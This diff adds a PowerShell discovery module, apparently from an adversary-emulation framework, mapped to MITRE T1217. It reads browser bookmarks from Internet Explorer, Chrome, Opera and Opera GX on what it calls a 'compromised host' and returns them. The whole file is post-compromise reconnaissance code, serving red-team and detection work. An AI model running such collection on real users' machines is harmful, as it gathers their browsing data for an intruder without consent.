@@ -1,0 +1,170 @@
+#Title: invoke-getfavsweb
+#Technique: T1217
+#Tactic: TA0007
+
+# get_data returns the bookmarks the function get data from different places (1X - Windows // 2X - MacOS // 3X Linux) and from different programs (X1 - Internet Explorar // X2 Google Chrome // X3 Opera)
+function get_data($valor)
+{
+  $WindowsUserFolder = $Env:USERPROFILE + "\AppData"
+
+  if ($valor -eq 10) {
+    $IE0 = Get-ChildItem ([Environment]::GetFolderPath('Favorites')) -File -Recurse | ForEach-Object {
+      [pscustomobject]@{
+          Name = $_.Name
+          URL = ($_ | Select-String "^URL").Line.Trim("URL=")
+      }
+    }
+    return $IE0
+  } elseif ($valor -eq 11) {
+    $WindowsChromeFolder = $WindowsUserFolder + "\Local\Google"
+    #chrome bookmark_bar
+    $json = Get-ChildItem -Path $WindowsChromeFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $chrome0 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand bookmark_bar | Select-Object -expand children | Select-Object name, url | Out-String
+    #chrome other
+    $json = Get-ChildItem -Path $WindowsChromeFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $chrome1 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand other | Select-Object -expand children | Select-Object name, url | Out-String
+    #chrome synced
+    $json = Get-ChildItem -Path $WindowsChromeFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $chrome2 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand synced | Select-Object -expand children | Select-Object name, url | Out-String
+    return $chrome0 + $chrome1 + $chrome2
+
+  } elseif ($valor -eq 12) {
+    $WindowsOperaFolder = $WindowsUserFolder + "\Roaming\Opera Software\Opera Stable"
+    #opera bookmark_bar
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera0 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand bookmark_bar | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera other
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera1 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand other | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera synced
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera2 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand synced | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera TODO
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera3 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand custom_root | Select-Object -expand speedDial | Select-Object -expand children | Select-Object -expand children | Select-Object name, url | Out-String
+    return $opera0 + $opera1 + $opera2 + $opera3
+  } elseif ($valor -eq 13) {
+    $WindowsOperaFolder = $WindowsUserFolder + "\Roaming\Opera Software\Opera GX Stable"
+    #opera bookmark_bar
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera0 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand bookmark_bar | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera other
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera1 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand other | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera synced
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera2 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand synced | Select-Object -expand children | Select-Object name, url | Out-String
+    #opera TODO
+    $json = Get-ChildItem -Path $WindowsOperaFolder -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force | ForEach-Object { $_.FullName }
+    $opera3 = Invoke-WebRequest -Uri $json -UseBasicParsing |
+    ConvertFrom-Json | Select-Object -Expand roots | Select-Object -expand custom_root | Select-Object -expand speedDial | Select-Object -expand children | Select-Object -expand children | Select-Object name, url | Out-String
+    return $opera0 + $opera1 + $opera2 + $opera3
+  }
+}
+
+function invoke-getfavsweb
+{
+  <#
+  .SYNOPSIS
+  Browser Bookmark Discovery
+  .DESCRIPTION
+  Enumerates browser bookmarks to learn about the compromised host.
+
+  .LINK
+  https://attack.mitre.org/techniques/T1217/
+  #>
+  
+    $results = ""
+    $good = $false
+
+    $WindowsUserFolder = $Env:USERPROFILE + "\AppData"
+    $WindowsChromeExist = Test-Path $WindowsUserFolder"\Local\Google"
+    $WindowsOperaExist = Test-Path $WindowsUserFolder"\Roaming\Opera Software\Opera Stable"
+    $WindowsOperaGXExist = Test-Path $WindowsUserFolder"\Roaming\Opera Software\Opera GX Stable"
+
+    #Check if the powershell version is 5.1 or lmess, if it is the system will be windows if not it will be checked later.
+    if($PSVersionTable.PSVersion.Major -match "[1-5]")
+    {
+      # INTERNER EXPLORER
+      $received = get_data(10)
+      $results = $results + $received
+      # GOOGLE CHROME
+      if ($WindowsChromeExist -eq $true) 
+      {
+        $received = get_data(11)
+        $results = $results + $received
+      } 
+      # OPERA
+      if ($WindowsOperaExist -eq $true)
+      {
+        $received = get_data(12)
+        $results = $results + $received
+      }
+      # OPERA GX
+      if ($WindowsOperaGXExist -eq $true)
+      {
+        $received = get_data(13)
+        $results = $results + $received
+      }
+    } else {
+      #If Windows is detected and is using powershell 6+ it will execute this code.
+      if ($isWindows)
+      {
+        # INTERNER EXPLORER
+        $received = get_data(10)
+        $results = $results + $received
+        # GOOGLE CHROME
+        if ($WindowsChromeExist) 
+        {
+          $received = get_data(11)
+          $results = $results + $received
+        } 
+        # OPERA
+        if ($WindowsOperaExist)
+        {
+          $received = get_data(12)
+          $results = $results + $received
+        }
+        # OPERA GX
+        if ($WindowsOperaGXExist -eq $true)
+        {
+          $received = get_data(13)
+          $results = $results + $received
+        }
+      }
+      #If MacOs is detected it will execute this code
+      elseif ($isMacOs)
+      {
+        $results = "MacOs Detected"
+      }
+      #If Linux distribution is detected it will run this code
+      elseif ($isLinux)
+      {
+        $results = "Linux Detected"
+      }
+    }
+    
+    if (($null -ne $results) -or ("" -ne $results))
+    {
+      $good = $true
+      return @{results = $results | Out-String; success = $good }
+    } else {
+      return @{ results = $null; success = $good }
+    }
+  }
+#Main program
+$execute = {}
+
+$execute = invoke-getfavsweb
+
+return @{results=$execute.results;success=$execute.success}
